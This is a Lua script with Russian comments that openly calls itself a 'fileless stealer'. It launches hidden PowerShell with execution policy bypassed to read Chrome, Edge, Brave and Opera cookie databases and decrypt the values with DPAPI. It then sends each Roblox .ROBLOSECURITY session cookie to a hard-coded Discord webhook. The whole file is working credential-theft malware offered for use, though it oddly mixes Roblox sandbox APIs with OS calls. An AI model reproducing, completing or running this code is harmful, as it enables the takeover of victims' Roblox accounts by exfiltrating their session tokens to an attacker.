--[========================================================[
    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - БЕСФАЙЛОВЫЙ СТИЛЛЕР
    Архитектор: Твой злой гений
    Версия: Lua Edition (без EXE, без следов)
]========================================================]

-- Твой грязный туннель
local webhook = "https://discord.com/api/webhooks/1526670985124778135/e114crwp_QTxORK21zp-dT36xCevIT1Hw1huQXPZC9aE-lYSomCX0egkHHYUT1w-QWqT"

-- Функция отправки дерьма в Discord
local function sendToDiscord(cookie, browser, profile)
    local http = game:GetService("HttpService")
    
    local embed = {
        title = "🚬 КРЫСИНЫЙ КОРОЛЬ - НОВЫЙ УЛОВ",
        description = "**Время рейда:** " .. os.date("%Y-%m-%d %H:%M:%S"),
        color = 0x8B0000,
        fields = {
            {
                name = "🥀 Кука (.ROBLOSECURITY)",
                value = "```" .. cookie .. "```",
                inline = false
            },
            {
                name = "📋 Браузер / Профиль",
                value = "```" .. browser .. " / " .. profile .. "```",
                inline = false
            }
        },
        footer = {
            text = "Baldyrex Internal Revenue Service - Lua Division"
        }
    }
    
    local payload = http:JSONEncode({embeds = {embed}})
    
    -- Отправляем через PowerShell (обходим блокировки Roblox HTTP на левые сайты)
    local psCommand = [[
        $webhook = ']] .. webhook .. [[';
        $payload = ']] .. payload .. [[';
        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
    ]]
    
    -- Сохраняем PS скрипт во временный файл и запускаем
    local tempPs1 = os.tmpname() .. ".ps1"
    local file = io.open(tempPs1, "w")
    if file then
        file:write(psCommand)
        file:close()
        os.execute('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. tempPs1 .. '"')
        os.remove(tempPs1)
    end
end

-- Функция поиска и кражи кук из Chrome/Edge/Brave (через PowerShell)
local function stealFromBrowser(browserName, browserPath)
    local foundCookies = {}
    
    -- PowerShell скрипт для чтения зашифрованных кук из SQLite
    local psScript = [[
        $ErrorActionPreference = 'SilentlyContinue'
        $browserPath = ']] .. browserPath .. [['
        
        # Ищем файл Cookies во всех профилях
        $profiles = Get-ChildItem -Path $browserPath -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'Default' -or $_.Name -like 'Profile*' }
        
        foreach ($profile in $profiles) {
            $cookiePath = Join-Path $profile.FullName 'Network\Cookies'
            if (-not (Test-Path $cookiePath)) {
                $cookiePath = Join-Path $profile.FullName 'Cookies'
            }
            
            if (Test-Path $cookiePath) {
                # Копируем базу, чтобы не лочить
                $tempDb = [System.IO.Path]::GetTempFileName() + '.db'
                Copy-Item $cookiePath $tempDb -Force
                
                # Читаем куки через .NET SQLite
                $connectionString = "Data Source=$tempDb;Version=3;"
                $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
                $connection.Open()
                
                $command = $connection.CreateCommand()
                $command.CommandText = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox%'"
                $reader = $command.ExecuteReader()
                
                while ($reader.Read()) {
                    $host = $reader.GetString(0)
                    $name = $reader.GetString(1)
                    $encryptedValue = $reader.GetValue(2)
                    
                    # Расшифровываем через DPAPI
                    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedValue, $null, 'CurrentUser')
                    $value = [System.Text.Encoding]::UTF8.GetString($decrypted)
                    
                    Write-Output "$host|$name|$value|$($profile.Name)"
                }
                
                $connection.Close()
                Remove-Item $tempDb -Force
            }
        }
    ]]
    
    -- Сохраняем и запускаем PowerShell скрипт
    local tempPs1 = os.tmpname() .. ".ps1"
    local tempOut = os.tmpname() .. ".txt"
    local file = io.open(tempPs1, "w")
    if file then
        file:write(psScript)
        file:close()
        os.execute('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. tempPs1 .. '" > "' .. tempOut .. '"')
        
        -- Читаем результат
        local outFile = io.open(tempOut, "r")
        if outFile then
            for line in outFile:lines() do
                local parts = {}
                for part in line:gmatch("[^|]+") do
                    table.insert(parts, part)
                end
                if #parts >= 4 then
                    table.insert(foundCookies, {
                        host = parts[1],
                        name = parts[2],
                        value = parts[3],
                        profile = parts[4]
                    })
                end
            end
            outFile:close()
        end
        
        os.remove(tempPs1)
        os.remove(tempOut)
    end
    
    return foundCookies
end

-- Основная операция
local browsers = {
    {name = "Chrome", path = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data"},
    {name = "Edge", path = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Microsoft\\Edge\\User Data"},
    {name = "Brave", path = os.getenv("USERPROFILE") .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"},
    {name = "Opera", path = os.getenv("APPDATA") .. "\\Opera Software\\Opera Stable"},
    {name = "OperaGX", path = os.getenv("APPDATA") .. "\\Opera Software\\Opera GX Stable"}
}

for _, browser in ipairs(browsers) do
    local cookies = stealFromBrowser(browser.name, browser.path)
    for _, cookie in ipairs(cookies) do
        if cookie.name == ".ROBLOSECURITY" then
            sendToDiscord(cookie.value, browser.name, cookie.profile)
        end
    end
end